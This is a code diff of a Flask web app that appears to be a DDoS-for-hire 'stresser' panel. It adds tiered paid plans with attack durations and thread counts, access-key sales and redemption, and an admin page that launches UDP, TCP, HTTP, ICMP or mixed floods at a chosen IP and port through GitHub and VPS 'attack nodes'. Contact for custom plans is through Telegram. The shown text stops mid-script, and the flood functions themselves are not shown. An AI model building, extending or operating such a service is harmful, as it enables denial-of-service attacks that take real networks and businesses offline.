@@ -11,7 +11,7 @@ import secrets
 import paramiko
 import json
 import io
-import uuid
+import certifi
 from datetime import datetime, timedelta
 from functools import wraps
 from flask import Flask, render_template_string, request, redirect, url_for, flash, session, jsonify
@@ -20,7 +20,6 @@ from bson.objectid import ObjectId
 from werkzeug.security import generate_password_hash, check_password_hash
 from flask_sqlalchemy import SQLAlchemy
 from github import Github, GithubException
-import certifi
 
 # ==================== FLASK APP INIT ====================
 app = Flask(__name__)
@@ -36,6 +35,14 @@ GLOBAL_COOLDOWN = 30
 MAX_ATTACK_DURATION = 300
 DEFAULT_THREADS = 1500
 MAX_THREADS_LIMIT = 10000
+
+# ==================== PLAN DEFINITIONS ====================
+PLANS = [
+    {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'threads': 1500, 'key_prefix': 'FREE'},
+    {'name': 'Pro Plan', 'price': '₹399/month', 'concurrent': 1, 'duration': 120, 'threads': 3000, 'key_prefix': 'PRO'},
+    {'name': 'Enterprise Plan', 'price': '₹999/month', 'concurrent': 5, 'duration': 300, 'threads': 5000, 'key_prefix': 'ENT'},
+    {'name': 'Ultimate Plan', 'price': '₹2499/month', 'concurrent': 10, 'duration': 600, 'threads': 10000, 'key_prefix': 'ULT'}
+]
 
 # ==================== ATTACK QUEUE ====================
 attack_lock = threading.Lock()
@@ -54,7 +61,7 @@ if MONGO_URL:
             connectTimeoutMS=30000,
             socketTimeoutMS=30000,
             tls=True,
-            tlsCAFile=certifi.where()  # Fixes SSL handshake on Render
+            tlsCAFile=certifi.where()
         )
         mongo_client.admin.command('ping')
         db = mongo_client['stresser_db']
@@ -74,11 +81,9 @@ if USE_MONGO:
     admin_users_col = db['admin_users']
     generated_keys_col = db['generated_keys']
 else:
-    # SQLite fallback (your existing code)
     app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///stresser.db'
     app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
     db_sql = SQLAlchemy(app)
-    # ... (rest of SQLAlchemy models unchanged)
 
     class User(db_sql.Model):
         id = db_sql.Column(db_sql.Integer, primary_key=True)
@@ -149,7 +154,8 @@ else:
     class GeneratedKey(db_sql.Model):
         id = db_sql.Column(db_sql.Integer, primary_key=True)
         key = db_sql.Column(db_sql.String(64), unique=True, nullable=False)
-        duration_days = db_sql.Column(db_sql.Integer, default=7)
+        plan = db_sql.Column(db_sql.String(50), default="Pro Plan")
+        duration_days = db_sql.Column(db_sql.Integer, default=30)
         created_by = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
         created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)
         used_by = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'), nullable=True)
@@ -628,67 +634,77 @@ def products_page():
         user = users_col.find_one({"_id": ObjectId(session['user_id'])})
     else:
         user = User.query.get(session['user_id'])
-    plans = [
-        {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'threads': 1500},
-        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'threads': 3000},
-        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'threads': 5000},
-        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'threads': 10000}
-    ]
-    return render_template_string(PRODUCTS_HTML, user=user, plans=plans)
+    return render_template_string(PRODUCTS_HTML, user=user, plans=PLANS)
 
 @app.route('/redeem', methods=['GET', 'POST'])
 def redeem_key():
     if request.method == 'POST':
         key_str = request.form.get('key', '').strip().upper()
-        print(f"Redeem attempt with key: {key_str}")  # Debug log
-        
         if USE_MONGO:
             key = generated_keys_col.find_one({"key": key_str, "active": True, "used_by": None})
         else:
             key = GeneratedKey.query.filter_by(key=key_str, active=True, used_by=None).first()
-        
         if not key:
             flash('Invalid or already used key', 'danger')
             return redirect(url_for('dashboard'))
-        
+
         days = key['duration_days'] if USE_MONGO else key.duration_days
-        
+        plan_name = key.get('plan', 'Pro Plan') if USE_MONGO else key.plan
+        plan = next((p for p in PLANS if p['name'] == plan_name), PLANS[1])
+
         if 'user_id' in session:
             if USE_MONGO:
-                user = users_col.find_one({"_id": ObjectId(session['user_id'])})
+                users_col.update_one(
+                    {"_id": ObjectId(session['user_id'])},
+                    {"$set": {
+                        "plan": plan_name,
+                        "max_concurrent": plan['concurrent'],
+                        "max_duration": plan['duration'],
+                        "max_threads": plan['threads'],
+                        "expiry": datetime.utcnow() + timedelta(days=days),
+                        "role": "user"
+                    }}
+                )
             else:
                 user = User.query.get(session['user_id'])
-            
-            if not user:
-                session.clear()
-                return redirect(url_for('login'))
-            
-            expiry = datetime.utcnow() + timedelta(days=days)
-            if USE_MONGO:
-                users_col.update_one({"_id": user['_id']}, {"$set": {"expiry": expiry, "role": "user"}})
-            else:
-                user.expiry = expiry
+                user.plan = plan_name
+                user.max_concurrent = plan['concurrent']
+                user.max_duration = plan['duration']
+                user.max_threads = plan['threads']
+                user.expiry = datetime.utcnow() + timedelta(days=days)
                 user.role = 'user'
                 db_sql.session.commit()
         else:
-            # User not logged in – create new account with key
             token = generate_token()
             expiry = datetime.utcnow() + timedelta(days=days)
             if USE_MONGO:
                 user_id = users_col.insert_one({
-                    "token": token, "plan": "Key Access", "max_concurrent": 5, "max_duration": 300,
-                    "max_threads": 3000, "role": "user", "expiry": expiry, "created_at": datetime.utcnow()
+                    "token": token,
+                    "plan": plan_name,
+                    "max_concurrent": plan['concurrent'],
+                    "max_duration": plan['duration'],
+                    "max_threads": plan['threads'],
+                    "role": "user",
+                    "expiry": expiry,
+                    "created_at": datetime.utcnow()
                 }).inserted_id
             else:
-                user = User(token=token, plan="Key Access", max_concurrent=5, max_duration=300, max_threads=3000, role="user", expiry=expiry)
+                user = User(
+                    token=token,
+                    plan=plan_name,
+                    max_concurrent=plan['concurrent'],
+                    max_duration=plan['duration'],
+                    max_threads=plan['threads'],
+                    role="user",
+                    expiry=expiry
+                )
                 db_sql.session.add(user)
                 db_sql.session.commit()
                 user_id = user.id
             session['user_token'] = token
             session['user_id'] = str(user_id) if USE_MONGO else user_id
             session['user_role'] = 'user'
-        
-        # Mark key as used
+
         if USE_MONGO:
             generated_keys_col.update_one({"_id": key['_id']}, {"$set": {"used_by": session['user_id'], "used_at": datetime.utcnow(), "active": False}})
         else:
@@ -696,11 +712,10 @@ def redeem_key():
             key.used_at = datetime.utcnow()
             key.active = False
             db_sql.session.commit()
-        
-        flash('Key redeemed successfully! Your plan has been upgraded.', 'success')
+
+        flash(f'Key redeemed! Your plan is now {plan_name}.', 'success')
         return redirect(url_for('dashboard'))
-    
-    # GET request – show redeem page
+
     return render_template_string(REDEEM_HTML)
 
 @app.route('/logout')
@@ -977,29 +992,32 @@ def admin_keys():
         keys = list(generated_keys_col.find().sort("created_at", -1))
     else:
         keys = GeneratedKey.query.order_by(GeneratedKey.created_at.desc()).all()
-    return render_template_string(ADMIN_KEYS_HTML, keys=keys)
+    return render_template_string(ADMIN_KEYS_HTML, keys=keys, plans=PLANS)
 
 @app.route('/admin/keys/generate', methods=['POST'])
 @admin_required
 def generate_keys():
-    prefix = request.form.get('prefix', 'KEY')
-    days = int(request.form.get('days', 7))
+    plan_name = request.form.get('plan', 'Pro Plan')
+    days = int(request.form.get('days', 30))
     count = int(request.form.get('count', 1))
+    plan = next((p for p in PLANS if p['name'] == plan_name), PLANS[1])
+    prefix = plan['key_prefix']
     keys_created = []
     for _ in range(count):
         key_str = f"{prefix}-{secrets.token_hex(4).upper()}"
         if USE_MONGO:
             generated_keys_col.insert_one({
-                "key": key_str, "duration_days": days, "created_by": session.get('admin_user_id'),
-                "created_at": datetime.utcnow(), "active": True, "used_by": None
+                "key": key_str, "plan": plan_name, "duration_days": days,
+                "created_by": session.get('admin_user_id'), "created_at": datetime.utcnow(),
+                "active": True, "used_by": None
             })
         else:
-            key = GeneratedKey(key=key_str, duration_days=days, created_by=session['admin_user_id'])
+            key = GeneratedKey(key=key_str, plan=plan_name, duration_days=days, created_by=session['admin_user_id'])
             db_sql.session.add(key)
         keys_created.append(key_str)
     if not USE_MONGO:
         db_sql.session.commit()
-    flash(f"Generated {count} key(s): {', '.join(keys_created)}", 'success')
+    flash(f"Generated {count} key(s) for {plan_name}: {', '.join(keys_created)}", 'success')
     return redirect(url_for('admin_keys'))
 
 @app.route('/admin/keys/<key_id>/delete', methods=['POST'])
@@ -1015,7 +1033,6 @@ def delete_key(key_id):
     flash('Key deleted', 'success')
     return redirect(url_for('admin_keys'))
 
-# ==================== ADMIN SETTINGS ROUTES ====================
 @app.route('/admin/settings')
 @admin_required
 def admin_settings():
@@ -1122,6 +1139,99 @@ def admin_clear_collection(collection):
             flash('All generated keys cleared', 'success')
     return redirect(url_for('admin_settings'))
 
+@app.route('/admin/test-attack', methods=['GET', 'POST'])
+@admin_required
+def admin_test_attack():
+    if request.method == 'POST':
+        target = request.form.get('target')
+        port = int(request.form.get('port'))
+        duration = int(request.form.get('duration'))
+        method = request.form.get('method', 'udp')
+        threads = int(request.form.get('threads', DEFAULT_THREADS))
+
+        if duration > 30:
+            flash('Test duration limited to 30 seconds', 'warning')
+            duration = 30
+
+        if USE_MONGO:
+            github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
+            vps_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "vps"}))
+        else:
+            github_nodes = AttackNode.query.filter_by(enabled=True, node_type='github').all()
+            vps_nodes = AttackNode.query.filter_by(enabled=True, node_type='vps').all()
+
+        results = []
+        github_success = 0
+        vps_success = 0
+
+        # Test GitHub nodes
+        for node in github_nodes:
+            node_name = node['name'] if USE_MONGO else node.name
+            try:
+                if trigger_github_attack(node, target, port, duration, method, threads):
+                    results.append({'name': node_name, 'type': 'GitHub', 'status': '✅ Success', 'details': ''})
+                    github_success += 1
+                else:
+                    results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Failed', 'details': 'Trigger returned False'})
+            except Exception as e:
+                results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Error', 'details': str(e)[:50]})
+
+        # Test VPS nodes
+        for node in vps_nodes:
+            node_name = node['name'] if USE_MONGO else node.name
+            try:
+                if trigger_vps_attack(node, target, port, duration, method, threads):
+                    results.append({'name': node_name, 'type': 'VPS', 'status': '✅ Success', 'details': ''})
+                    vps_success += 1
+                else:
+                    results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Failed', 'details': 'Trigger returned False'})
+            except Exception as e:
+                results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Error', 'details': str(e)[:50]})
+
+        flash(f'Test completed: GitHub {github_success}/{len(github_nodes)} | VPS {vps_success}/{len(vps_nodes)}', 'info')
+        return render_template_string(ADMIN_TEST_ATTACK_HTML,
+                                      results=results, target=target, port=port, duration=duration,
+                                      method=method, threads=threads,
+                                      github_total=len(github_nodes), vps_total=len(vps_nodes),
+                                      github_success=github_success, vps_success=vps_success)
+
+    return render_template_string(ADMIN_TEST_ATTACK_HTML, results=None)
+    
+@app.route('/admin/test-attack/single', methods=['POST'])
+@admin_required
+def admin_test_single_node():
+    """Test a single node with safe defaults, returns JSON."""
+    node_id = request.form.get('single_node')
+    target = request.form.get('target', '127.0.0.1')
+    port = int(request.form.get('port', 443))
+    duration = min(int(request.form.get('duration', 5)), 10)   # max 10s for safety
+    method = request.form.get('method', 'udp')
+    threads = int(request.form.get('threads', 500))
+
+    if USE_MONGO:
+        node = attack_nodes_col.find_one({"_id": ObjectId(node_id)})
+    else:
+        node = AttackNode.query.get(node_id)
+
+    if not node:
+        return jsonify({'status': 'error', 'message': 'Node not found'}), 404
+
+    node_name = node['name'] if USE_MONGO else node.name
+    node_type = node['node_type'] if USE_MONGO else node.node_type
+
+    try:
+        if node_type == 'github':
+            success = trigger_github_attack(node, target, port, duration, method, threads)
+        else:
+            success = trigger_vps_attack(node, target, port, duration, method, threads)
+
+        if success:
+            return jsonify({'status': 'success', 'message': f'Attack launched on {node_name}'})
+        else:
+            return jsonify({'status': 'failed', 'message': 'Attack trigger returned False'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)[:100]})
+
 # ==================== LIVE STATUS APIs ====================
 @app.route('/admin/nodes/status/all')
 @admin_required
@@ -1134,23 +1244,15 @@ def admin_nodes_status_all():
     for node in nodes:
         if USE_MONGO:
             result.append({
-                'id': str(node['_id']),
-                'name': node['name'],
-                'type': node['node_type'],
-                'enabled': node.get('enabled', True),
-                'status': node.get('status_detail', 'unknown'),
-                'binary': node.get('binary_present', False),
-                'attack_count': node.get('attack_count', 0)
+                'id': str(node['_id']), 'name': node['name'], 'type': node['node_type'],
+                'enabled': node.get('enabled', True), 'status': node.get('status_detail', 'unknown'),
+                'binary': node.get('binary_present', False), 'attack_count': node.get('attack_count', 0)
             })
         else:
             result.append({
-                'id': node.id,
-                'name': node.name,
-                'type': node.node_type,
-                'enabled': node.enabled,
-                'status': node.status_detail or 'unknown',
-                'binary': node.binary_present,
-                'attack_count': node.attack_count
+                'id': node.id, 'name': node.name, 'type': node.node_type,
+                'enabled': node.enabled, 'status': node.status_detail or 'unknown',
+                'binary': node.binary_present, 'attack_count': node.attack_count
             })
     return jsonify(result)
 
@@ -1175,11 +1277,7 @@ def admin_attack_status():
     with attack_lock:
         queue_len = len(attack_queue)
         cur = current_attack.copy() if current_attack else None
-    return jsonify({
-        'is_attacking': is_attacking,
-        'queue_length': queue_len,
-        'current_attack': cur
-    })
+    return jsonify({'is_attacking': is_attacking, 'queue_length': queue_len, 'current_attack': cur})
 
 @app.route('/admin/attack/stop', methods=['POST'])
 @admin_required
@@ -1191,69 +1289,6 @@ def admin_stop_attack():
         current_attack = None
     flash('Attack queue cleared', 'success')
     return redirect(url_for('admin_dashboard'))
-    
-@app.route('/admin/test-attack', methods=['GET', 'POST'])
-@admin_required
-def admin_test_attack():
-    """Test attack page for admins to verify nodes are working."""
-    if request.method == 'POST':
-        target = request.form.get('target')
-        port = int(request.form.get('port'))
-        duration = int(request.form.get('duration'))
-        method = request.form.get('method', 'udp')
-        threads = int(request.form.get('threads', DEFAULT_THREADS))
-
-        if duration > 30:  # Limit test duration for safety
-            flash('Test duration limited to 30 seconds', 'warning')
-            duration = 30
-
-        # Get all enabled nodes
-        if USE_MONGO:
-            github_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "github"}))
-            vps_nodes = list(attack_nodes_col.find({"enabled": True, "node_type": "vps"}))
-        else:
-            github_nodes = AttackNode.query.filter_by(enabled=True, node_type='github').all()
-            vps_nodes = AttackNode.query.filter_by(enabled=True, node_type='vps').all()
-
-        results = []
-        github_success = 0
-        vps_success = 0
-
-        # Test GitHub nodes
-        for node in github_nodes:
-            node_name = node['name'] if USE_MONGO else node.name
-            try:
-                if trigger_github_attack(node, target, port, duration, method, threads):
-                    results.append({'name': node_name, 'type': 'GitHub', 'status': '✅ Success'})
-                    github_success += 1
-                else:
-                    results.append({'name': node_name, 'type': 'GitHub', 'status': '❌ Failed'})
-            except Exception as e:
-                results.append({'name': node_name, 'type': 'GitHub', 'status': f'❌ Error: {str(e)[:30]}'})
-
-        # Test VPS nodes
-        for node in vps_nodes:
-            node_name = node['name'] if USE_MONGO else node.name
-            try:
-                if trigger_vps_attack(node, target, port, duration, method, threads):
-                    results.append({'name': node_name, 'type': 'VPS', 'status': '✅ Success'})
-                    vps_success += 1
-                else:
-                    results.append({'name': node_name, 'type': 'VPS', 'status': '❌ Failed'})
-            except Exception as e:
-                results.append({'name': node_name, 'type': 'VPS', 'status': f'❌ Error: {str(e)[:30]}'})
-
-        flash(f'Test completed: GitHub {github_success}/{len(github_nodes)} | VPS {vps_success}/{len(vps_nodes)}', 'info')
-        return render_template_string(ADMIN_TEST_ATTACK_HTML,
-                                      results=results,
-                                      target=target, port=port, duration=duration,
-                                      method=method, threads=threads,
-                                      github_total=len(github_nodes), vps_total=len(vps_nodes),
-                                      github_success=github_success, vps_success=vps_success)
-
-    return render_template_string(ADMIN_TEST_ATTACK_HTML, results=None)
-    
-# ---------- HTML Templates ----------
 
 LOGIN_HTML = '''
 <!DOCTYPE html>
@@ -1340,7 +1375,6 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'
     </div>
 </div>
 <div class="main">
-    <!-- Network Status Card -->
     <div class="glass-card">
         <div class="d-flex justify-content-between align-items-center">
             <h3><i class="fas fa-chart-line me-2"></i> Network Status</h3>
@@ -1356,21 +1390,17 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'
         </div>
         <div class="mt-4"><a href="/products" class="btn-neon">⚡ Upgrade Now</a></div>
     </div>
-
-<!-- REDEEM KEY CARD (FIXED) -->
-<div class="glass-card">
-    <h3><i class="fas fa-key me-2"></i> Redeem Access Key</h3>
-    <p>Have a premium key? Redeem it here to upgrade your plan instantly.</p>
-    <form method="POST" action="/redeem" id="redeemForm">
-        <div class="input-group">
-            <input type="text" name="key" class="form-control bg-dark text-white" placeholder="Enter your key (e.g., KEY-XXXXXXXX)" required>
-            <button type="submit" class="btn-neon" style="width:auto; padding:12px 30px; border-radius:60px;">Redeem</button>
-        </div>
-    </form>
-    <small class="text-muted">Key will be applied to your current account.</small>
-</div>
-
-    <!-- Recent Attacks Card -->
+    <div class="glass-card">
+        <h3><i class="fas fa-key me-2"></i> Redeem Access Key</h3>
+        <p>Have a premium key? Redeem it here to upgrade your plan instantly.</p>
+        <form method="POST" action="/redeem">
+            <div class="input-group">
+                <input type="text" name="key" class="form-control bg-dark text-white" placeholder="Enter your key (e.g., KEY-XXXXXXXX)" required>
+                <button type="submit" class="btn-neon" style="width:auto; padding:12px 30px; border-radius:60px;">Redeem</button>
+            </div>
+        </form>
+        <small class="text-muted">Key will be applied to your current account.</small>
+    </div>
     <div class="glass-card">
         <h3><i class="fas fa-history me-2"></i> Recent Attacks</h3>
         <div class="table-responsive">
@@ -1445,7 +1475,6 @@ PRODUCTS_HTML = '''
 .glass-card:hover{border-color:rgba(0,255,200,0.6);transform:translateY(-3px);}
 .btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
 .pricing-card{text-align:center;}.price{font-size:36px;font-weight:800;color:#00ffcc;}
-.telegram-link{color:#00ffcc; text-decoration:none; font-weight:600;}
 @keyframes fadeInUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
 </style>
 </head>
@@ -1461,6 +1490,21 @@ PRODUCTS_HTML = '''
 <div class="glass-card mt-4 text-center"><h4>Need a custom plan?</h4><p>Reach out directly on Telegram:</p>
 <a href="https://t.me/Ig_ansh" target="_blank" class="btn-neon" style="display:inline-block; text-decoration:none;"><i class="fab fa-telegram-plane me-2"></i>@Ig_ansh</a></div>
 </div></body></html>
+'''
+
+REDEEM_HTML = '''
+<!DOCTYPE html>
+<html><head><title>Redeem Key</title><meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+<style>body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
+.glass-card{background:rgba(15,25,45,0.6);backdrop-filter:blur(12px);border-radius:32px;border:1px solid rgba(0,255,200,0.2);padding:40px;width:100%;max-width:450px;box-shadow:0 20px 40px rgba(0,0,0,0.4);}
+input{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:40px;padding:12px 20px;color:white;width:100%;margin-bottom:20px;}
+.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:40px;padding:12px;font-weight:bold;width:100%;}
+a{color:#00ffcc;text-decoration:none;}</style>
+</head><body><div class="glass-card"><h2 class="text-center mb-4" style="color:#00ffcc;">🔑 Redeem Access Key</h2>
+{% with messages = get_flashed_messages(with_categories=true) %}{% for cat,msg in messages %}<div class="alert alert-{{cat}}">{{msg}}</div>{% endfor %}{% endwith %}
+<form method="POST"><input type="text" name="key" placeholder="Enter your key" required><button type="submit" class="btn-neon">Redeem</button></form>
+<p class="text-center mt-3"><a href="/login">Back to login</a> | <a href="/register">Register</a></p></div></body></html>
 '''
 
 ADMIN_LOGIN_HTML = '''
@@ -1583,13 +1627,17 @@ ADMIN_KEYS_HTML = '''
 </head><body><div class="container"><div class="glass-card"><h3><i class="fas fa-key me-2"></i>Key Management</h3>
 <a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
 <form method="POST" action="/admin/keys/generate" class="row g-3 mb-4">
-  <div class="col-md-3"><input type="text" name="prefix" class="form-control" placeholder="Prefix" value="KEY"></div>
-  <div class="col-md-3"><input type="number" name="days" class="form-control" placeholder="Days" value="7"></div>
-  <div class="col-md-3"><input type="number" name="count" class="form-control" placeholder="Count" value="1"></div>
-  <div class="col-md-3"><button class="btn btn-success w-100"><i class="fas fa-plus"></i> Generate Keys</button></div>
+  <div class="col-md-3">
+    <select name="plan" class="form-select bg-dark text-white">
+      {% for p in plans %}<option value="{{ p.name }}">{{ p.name }}</option>{% endfor %}
+    </select>
+  </div>
+  <div class="col-md-2"><input type="number" name="days" class="form-control" placeholder="Days" value="30"></div>
+  <div class="col-md-2"><input type="number" name="count" class="form-control" placeholder="Count" value="1"></div>
+  <div class="col-md-5"><button class="btn btn-success w-100"><i class="fas fa-plus"></i> Generate Keys</button></div>
 </form>
-<table class="table table-dark"><thead><tr><th>Key</th><th>Days</th><th>Created</th><th>Used By</th><th>Status</th><th>Action</th></tr></thead>
-<tbody>{% for k in keys %}<tr><td><code>{{ k.key }}</code></td><td>{{ k.duration_days }}</td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td>
+<table class="table table-dark"><thead><tr><th>Key</th><th>Plan</th><th>Days</th><th>Created</th><th>Used By</th><th>Status</th><th>Action</th></tr></thead>
+<tbody>{% for k in keys %}<tr><td><code>{{ k.key }}</code></td><td>{{ k.plan }}</td><td>{{ k.duration_days }}</td><td>{{ k.created_at.strftime('%Y-%m-%d') }}</td>
 <td>{{ k.used_by or '-' }}</td><td>{% if k.active and not k.used_by %}<span class="badge bg-success">Active</span>{% elif k.used_by %}<span class="badge bg-info">Used</span>{% else %}<span class="badge bg-secondary">Inactive</span>{% endif %}</td>
 <td><form method="POST" action="/admin/keys/{{ k.id }}/delete" onsubmit="return confirm('Delete?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></body></html>
 '''
@@ -1663,44 +1711,130 @@ ADMIN_SETTINGS_HTML = '''
 ADMIN_TEST_ATTACK_HTML = '''
 <!DOCTYPE html>
 <html><head><title>Test Attack • Admin</title><meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>body{background:#0a0a1a;color:#fff;padding:20px;}.glass-card{background:rgba(15,25,45,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}</style>
-</head>
+<style>:root{--neon:#00ffcc;--danger:#ff3366;--warning:#ffaa00;--success:#00cc88;}
+body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);font-family:'Inter',sans-serif;color:#fff;padding:20px;}
+.glass-card{background:rgba(15,25,45,0.5);backdrop-filter:blur(12px);border-radius:24px;border:1px solid rgba(0,255,200,0.15);padding:20px;margin-bottom:20px;transition:0.3s;}
+.glass-card:hover{transform:translateY(-3px);border-color:rgba(0,255,200,0.4);box-shadow:0 10px 30px rgba(0,0,0,0.3);}
+.btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
+.btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
+.btn-danger{background:linear-gradient(90deg,#ff3366,#ff6680);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#fff;}
+.btn-warning{background:linear-gradient(90deg,#ffaa00,#ffcc33);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
+input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:40px;padding:12px 20px;color:white;width:100%;}
+.status-badge{padding:4px 10px;border-radius:40px;font-size:12px;font-weight:600;}
+.status-success{background:rgba(0,204,136,0.2);color:#00cc88;border:1px solid #00cc88;}
+.status-failed{background:rgba(255,51,102,0.2);color:#ff3366;border:1px solid #ff3366;}
+.status-running{background:rgba(255,170,0,0.2);color:#ffaa00;border:1px solid #ffaa00;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+.fade-in{animation:fadeIn 0.5s;}
+</style></head>
 <body><div class="container">
-<div class="glass-card"><h2><i class="fas fa-flask me-2"></i>Test Attack (Admin Only)</h2>
-<a href="/admin/dashboard" class="btn btn-secondary mb-3">← Back</a>
-<p class="text-warning">⚠️ This will launch a real attack. Use a safe target (e.g., localhost or test IP).</p>
-<form method="POST">
-    <div class="row">
-        <div class="col-md-4"><input type="text" name="target" class="form-control bg-dark text-white mb-2" placeholder="Target IP" required></div>
-        <div class="col-md-2"><input type="number" name="port" class="form-control bg-dark text-white mb-2" placeholder="Port" required></div>
-        <div class="col-md-2"><input type="number" name="duration" class="form-control bg-dark text-white mb-2" placeholder="Duration (max 30s)" value="10" min="1" max="30"></div>
-        <div class="col-md-2">
-            <select name="method" class="form-select bg-dark text-white mb-2">
-                <option value="udp">UDP</option><option value="tcp">TCP</option><option value="http">HTTP</option><option value="icmp">ICMP</option><option value="mixed">MIXED</option>
+<div class="d-flex justify-content-between align-items-center mb-4"><h2><i class="fas fa-flask me-2" style="color:var(--neon);"></i>Attack Testing Laboratory</h2><a href="/admin/dashboard" class="btn btn-outline-light"><i class="fas fa-arrow-left"></i> Back</a></div>
+
+<!-- Quick Test Panel -->
+<div class="glass-card"><h4><i class="fas fa-bolt me-2"></i>Quick Test Configuration</h4>
+<p class="text-warning"><i class="fas fa-exclamation-triangle me-1"></i> Use a safe target (e.g., 127.0.0.1 or a test server).</p>
+<form method="POST" id="testForm">
+    <div class="row g-3">
+        <div class="col-md-3"><label class="form-label">Target IP</label><input type="text" name="target" class="form-control bg-dark text-white" placeholder="192.168.1.1" required></div>
+        <div class="col-md-2"><label class="form-label">Port</label><input type="number" name="port" class="form-control bg-dark text-white" placeholder="443" required></div>
+        <div class="col-md-2"><label class="form-label">Duration (max 30s)</label><input type="number" name="duration" class="form-control bg-dark text-white" value="10" min="1" max="30"></div>
+        <div class="col-md-2"><label class="form-label">Method</label>
+            <select name="method" class="form-select bg-dark text-white">
+                <option value="udp">🔥 UDP</option><option value="tcp">🌐 TCP</option><option value="http">💻 HTTP</option><option value="icmp">📡 ICMP</option><option value="mixed">⚡ MIXED</option>
             </select>
         </div>
-        <div class="col-md-2"><input type="number" name="threads" class="form-control bg-dark text-white mb-2" placeholder="Threads" value="500"></div>
+        <div class="col-md-2"><label class="form-label">Threads</label><input type="number" name="threads" class="form-control bg-dark text-white" value="500"></div>
+        <div class="col-md-1 d-flex align-items-end"><button type="submit" class="btn-neon w-100"><i class="fas fa-play"></i> Test All</button></div>
     </div>
-    <button type="submit" class="btn btn-warning"><i class="fas fa-bolt"></i> Run Test</button>
 </form>
+</div>
+
+<!-- Individual Node Testing -->
+<div class="glass-card"><h4><i class="fas fa-server me-2"></i>Test Individual Nodes</h4>
+<div id="nodeListContainer"><div class="text-center text-muted">Loading nodes...</div></div>
+</div>
+
+<!-- Results Panel (appears after test) -->
 {% if results %}
-<hr><h4>Test Results</h4>
-<p>Target: {{ target }}:{{ port }} | Duration: {{ duration }}s | Method: {{ method }} | Threads: {{ threads }}</p>
-<div class="table-responsive"><table class="table table-dark">
-    <thead><tr><th>Node Name</th><th>Type</th><th>Status</th></tr></thead>
-    <tbody>
-    {% for r in results %}
-    <tr><td>{{ r.name }}</td><td>{{ r.type }}</td><td>{{ r.status|safe }}</td></tr>
-    {% endfor %}
-    </tbody>
+<div class="glass-card fade-in"><h4><i class="fas fa-clipboard-list me-2"></i>Test Results</h4>
+<p><strong>Target:</strong> {{ target }}:{{ port }} | <strong>Duration:</strong> {{ duration }}s | <strong>Method:</strong> {{ method }} | <strong>Threads:</strong> {{ threads }}</p>
+<div class="table-responsive"><table class="table table-dark table-hover">
+    <thead><tr><th>Node</th><th>Type</th><th>Status</th><th>Details</th></tr></thead>
+    <tbody>{% for r in results %}<tr><td>{{ r.name }}</td><td>{{ r.type }}</td><td><span class="status-badge {% if 'Success' in r.status %}status-success{% else %}status-failed{% endif %}">{{ r.status }}</span></td><td><small>{{ r.details or '' }}</small></td></tr>{% endfor %}</tbody>
 </table></div>
-<p><strong>Summary:</strong> GitHub: {{ github_success }}/{{ github_total }} | VPS: {{ vps_success }}/{{ vps_total }}</p>
+<div class="alert alert-info mt-3"><strong>Summary:</strong> GitHub: {{ github_success }}/{{ github_total }} | VPS: {{ vps_success }}/{{ vps_total }}</div>
+</div>
 {% endif %}
-</div></div></body></html>
+</div>
+
+<script>
+// Load nodes for individual testing
+async function loadNodes() {
+    try {
+        const res = await fetch('/admin/nodes/status/all');
+        const nodes = await res.json();
+        const container = document.getElementById('nodeListContainer');
+        if (nodes.length === 0) {
+            container.innerHTML = '<div class="text-muted">No nodes available.</div>';
+            return;
+        }
+        let html = '<div class="row g-3">';
+        nodes.forEach(node => {
